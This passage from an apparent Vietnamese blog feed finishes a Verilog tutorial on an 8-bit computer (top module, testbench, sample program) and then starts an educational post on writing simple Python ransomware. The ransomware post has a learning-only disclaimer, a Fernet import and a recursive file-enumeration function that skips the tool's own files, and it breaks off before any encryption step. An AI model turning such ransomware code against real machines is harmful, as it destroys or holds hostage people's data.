</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">b_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// adder 
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">adder_sub</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">adder_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">adder_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">adder</span> <span style="color:#e06c75">adder</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">a</span>(<span style="color:#e06c75">a_out</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">b</span>(<span style="color:#e06c75">b_out</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">sub</span>(<span style="color:#e06c75">adder_sub</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">adder_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// instruction register
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">ir_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">ir_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ir_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ir</span> <span style="color:#e06c75">ir</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">ir_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">ir_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// controller
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e06c75">controller</span> <span style="color:#e06c75">controller</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">opcode</span>(<span style="color:#e06c75">ir_out</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">4</span>]), <span style="color:#7f848e">// 4 bit đầu
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        .<span style="color:#e06c75">out</span>( <span style="color:#7f848e">// các tín hiệu out được kết nối với các tín hiệu bên trên
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">hlt</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">pc_inc</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">pc_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">mar_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">mem_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ir_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ir_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">a_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">a_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">b_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">adder_sub</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">adder_en</span>
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h3 id="testbench-cho-top_design">Testbench cho top_design</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">top_design_tb</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">initial</span> <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">$dumpfile</span>(<span style="color:#98c379">&#34;top_design_tb.vcd&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">$dumpvars</span>(<span style="color:#d19a66">0</span>, <span style="color:#e06c75">top_design_tb</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// reset máy tính
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">rst</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>        #<span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">rst</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// chọn giữa các đầu ra
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">4</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus_en</span> <span style="color:#56b6c2">=</span> {<span style="color:#e06c75">pc_en</span>, <span style="color:#e06c75">mem_en</span>, <span style="color:#e06c75">ir_en</span>, <span style="color:#e06c75">a_en</span>, <span style="color:#e06c75">adder_en</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">always</span> @ (<span style="color:#56b6c2">*</span>) 
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> (<span style="color:#e06c75">bus_en</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b00001</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">adder_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b00010</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">a_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b00100</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ir_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b01000</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mem_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#d19a66">5</span><span style="color:#d19a66">&#39;b10000</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pc_out</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">default</span><span style="color:#56b6c2">:</span> <span style="color:#e06c75">bus</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">endcase</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// tín hiệu clock
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">reg</span> <span style="color:#e06c75">clk_in</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">integer</span> <span style="color:#e06c75">i</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">initial</span> <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> (<span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>; <span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">128</span>; <span style="color:#e06c75">i</span><span style="color:#56b6c2">++</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>            #<span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">clk_in</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">~</span><span style="color:#e06c75">clk_in</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">clk</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">hlt</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">reg</span> <span style="color:#e06c75">rst</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">clock</span> <span style="color:#e06c75">clock</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">hlt</span>(<span style="color:#e06c75">hlt</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk_in</span>(<span style="color:#e06c75">clk_in</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk_out</span>(<span style="color:#e06c75">clk</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">pc_inc</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">pc_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">pc_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pc</span> <span style="color:#e06c75">pc</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">inc</span>(<span style="color:#e06c75">pc_inc</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">pc_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">mar_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">mem_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">mem_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">memory</span> <span style="color:#e06c75">mem</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">mar_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">mem_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">a_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">a_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">a_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">reg_a</span> <span style="color:#e06c75">reg_a</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">a_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">a_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">b_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">b_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">reg_b</span> <span style="color:#e06c75">reg_b</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">b_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">b_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">adder_sub</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">adder_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">adder_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">adder</span> <span style="color:#e06c75">adder</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">a</span>(<span style="color:#e06c75">a_out</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">b</span>(<span style="color:#e06c75">b_out</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">sub</span>(<span style="color:#e06c75">adder_sub</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">adder_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">ir_load</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span> <span style="color:#e06c75">ir_en</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">wire</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ir_out</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ir</span> <span style="color:#e06c75">ir</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">load</span>(<span style="color:#e06c75">ir_load</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">bus</span>(<span style="color:#e06c75">bus</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(<span style="color:#e06c75">ir_out</span>)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">controller</span> <span style="color:#e06c75">controller</span>(
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">clk</span>(<span style="color:#e06c75">clk</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">rst</span>(<span style="color:#e06c75">rst</span>),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">opcode</span>(<span style="color:#e06c75">ir_out</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">4</span>]),
</span></span><span style="display:flex;"><span>        .<span style="color:#e06c75">out</span>(
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">hlt</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">pc_inc</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">pc_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">mar_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">mem_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ir_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ir_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">a_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">a_en</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">b_load</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">adder_sub</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">adder_en</span>
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="lập-trình-cho-máy-tính">Lập trình cho máy tính</h2>
<p>Để lập trình trên máy tính này, chúng ta có thể lập trình từng byte trong file <code>program.bin</code>. File này sẽ được load vào mô-đun bộ nhớ khi máy tính được khởi động. Đây là 1 chương trình mẫu:</p>
<pre tabindex="0"><code class="language-bin" data-lang="bin">0D 2E 1F F0 00 00 00 00 00 00 00 00 00 05 04 02
</code></pre><p>Giải thích từng byte trong file <code>program.bin</code> (số hex đầu tiên sẽ là opcode, số hex thứ 2 sẽ là địa chỉ của dữ liệu):</p>
<pre tabindex="0"><code class="language-bin" data-lang="bin">$0      0D      // LDA $D   Load dữ liệu tại địa chỉ $D vào A
$1      1E      // ADD $E   Cộng dữ liệu trong A với dữ liệu tại địa chỉ $E
$2      2F      // SUB $F   Trừ dữ liệu trong A với dữ liệu tại địa chỉ $F
$3      F0      // HLT      Ngừng thực thi câu lệnh
$4      00      // Byte trống
$5      00      // Byte trống
$6      00      // Byte trống
$7      00      // Byte trống
$8      00      // Byte trống
$9      00      // Byte trống
$A      00      // Byte trống
$B      00      // Byte trống
$C      00      // Byte trống
$D      05      // Dữ liệu
$E      04      // Dữ liệu
$F      02      // Dữ liệu
</code></pre><p>Cuối cùng thì chúng ta đã làm xong máy tính 8-bit có thể hoạt động được. Đây là mô phỏng (<em>simulation</em>) của máy tính:</p>
<p><img src="/img/8bit-computer/8bit-computer-waveforms.png" alt="8bit computer waveforms"></p>
<p>Chúng ta có thể thấy là dữ liệu trong <em>reg_a</em> được cộng và trừ với dữ liệu trong <em>reg_b</em> đúng với chương trình trong <code>program.bin</code>.</p>
<blockquote>
<p>Bạn có thể đọc mã nguồn của dự án này tại <a href="https://github.com/namberino/fpga-computer/tree/8bit">đây</a>.</p></blockquote>
<h2 id="tài-liệu-tham-khảo">Tài liệu tham khảo</h2>
<ul>
<li><a href="https://www.youtube.com/playlist?list=PLowKtXNTBypGqImE405J2565dvjafglHU">Series máy tính 8-bit của Ben Eater</a></li>
<li><a href="https://www.amazon.com/Digital-Computer-Electronics-Jerald-Malvino-dp-0074622358/dp/0074622358/ref=dp_ob_title_bk">Digital Computer Electronics</a></li>
<li><a href="https://drive.google.com/file/d/17fH-JBU5OX_4AG123AO47y879YxzmDwX/view">SAP-1 Implementation Report</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Ransomware vô hại nhất trên thế giới</title>
            <link>https://namberino.github.io/vi/posts/2024/02/ransomware-v%C3%B4-h%E1%BA%A1i-nh%E1%BA%A5t-tr%C3%AAn-th%E1%BA%BF-gi%E1%BB%9Bi/</link>
            <pubDate>Fri, 23 Feb 2024 17:37:37 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/02/ransomware-v%C3%B4-h%E1%BA%A1i-nh%E1%BA%A5t-tr%C3%AAn-th%E1%BA%BF-gi%E1%BB%9Bi/</guid>
            <description>&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lưu ý&lt;/strong&gt;: &lt;strong&gt;Không&lt;/strong&gt; sử dụng phần mềm này cho việc xấu. Phần mềm này được làm cho mục đích học tập. Nếu bạn muốn chạy ransomware này thì chạy nó trong môi trường ảo, môi trường đã được cách ly. &lt;strong&gt;Đừng sử dụng nó cho việc xấu!&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Kể từ khi mình bắt đầu xem phim &lt;em&gt;Mr. Robot&lt;/em&gt;, mình thấy rất hứng thú với hacker và hack. Mình không phải là hacker nhưng mình rất thích học về các cách hack mà nhiều người khác nghĩ ra.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<blockquote>
<p><strong>Lưu ý</strong>: <strong>Không</strong> sử dụng phần mềm này cho việc xấu. Phần mềm này được làm cho mục đích học tập. Nếu bạn muốn chạy ransomware này thì chạy nó trong môi trường ảo, môi trường đã được cách ly. <strong>Đừng sử dụng nó cho việc xấu!</strong></p></blockquote>
<p>Kể từ khi mình bắt đầu xem phim <em>Mr. Robot</em>, mình thấy rất hứng thú với hacker và hack. Mình không phải là hacker nhưng mình rất thích học về các cách hack mà nhiều người khác nghĩ ra.</p>
<p>1 cách hack mà mình thấy rất thú vị là <em>ransomware</em>. Phần mềm này có khả năng mã hóa hết các file trên máy tính và tống tiền mình để giải mã các file đó. Với mình thì nó vừa đáng sợ, vừa thú vị.</p>
<p>Trong lúc mình học về ransomware, mình quyết định tự làm 1 con ransomware đơn giản và không có hại mấy để hiểu về ransomware hơn. Vậy nên trong bài đăng này chúng ta sẽ cùng học về ransomware bằng cách lập trình nó!</p>
<hr>
<h2 id="ý-tưởng-đằng-sau-ransomware">Ý tưởng đằng sau ransomware</h2>
<p>Ransomware sẽ mã hóa hết các file trên máy tính và chỉ giải mã các file đó khi mà hacker cho phép nó giải mã (điều này thường xảy ra sau khi nạn nhân bị hack đã trả tiền cho hacker).</p>
<p>Chúng ta sẽ cần 1 cách để tìm hết các file trên máy tính, mã hóa nó bằng 1 cái key (chìa khóa) giống như khóa bằng móc khóa ngoài đời thật, và giải mã nó bằng key mà mình dùng để mã hóa nó.</p>
<hr>
<h2 id="môi-trường-lập-trình">Môi trường lập trình</h2>
<p>Mình cần dùng <em>thư viện mã hóa</em> trong Python để mã hóa và giải mã các file mình tìm đc. Mình sử dụng thư viện có tên là <code>cryptography</code> và chúng ta có thể tải thư viện này bằng <code>pip</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install cryptography
</span></span></code></pre></div><hr>
<h2 id="cách-tìm-và-mã-hóa-file">Cách tìm và mã hóa file</h2>
<p>Thế làm thế nào để mình mã hóa hết các file trên máy? Đầu tiên thì mình phải tìm được hết các file trên máy tính. Mình sử dụng thư viện <code>os</code> của Python để tìm file. Mình cũng sẽ sử dụng thuật toán <em>Fernet</em> ở trong thư viện mã hóa mình vừa cài để mã hóa các file.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
</span></span></code></pre></div><p>Chúng ta lưu các file trên máy mà chúng ta tìm được trong 1 danh sách gọi là <code>files</code>.</p>
<p>Chúng ta cần check xem cái &ldquo;file&rdquo; đó là 1 file bình thường hay là 1 folder. Chúng ta có thể dùng hàm <code>os.path.isfile()</code> để check. Nếu như &ldquo;file&rdquo; đó không phải là file mà là folder thì chúng ta cần đi vào trong folder đó và check các file trong folder đó. Nếu folder đó có folder thì sẽ tiếp tục vào folder trong folder đó.</p>
<p>Sau khi chúng ta tìm đường dẫn của các file, chúng ta sẽ lưu đường dẫn tới các file đó trong danh sách <code>files</code>.</p>
<p>Chúng ta cũng cần tránh không lưu chương trình mã hóa, giải mã và key của mình trong lúc tìm kiếm file bởi vì nếu như chúng ta mã hóa file giải mã và file key thì sau này sẽ không giải mã các file được.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># bill-cipher.py</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
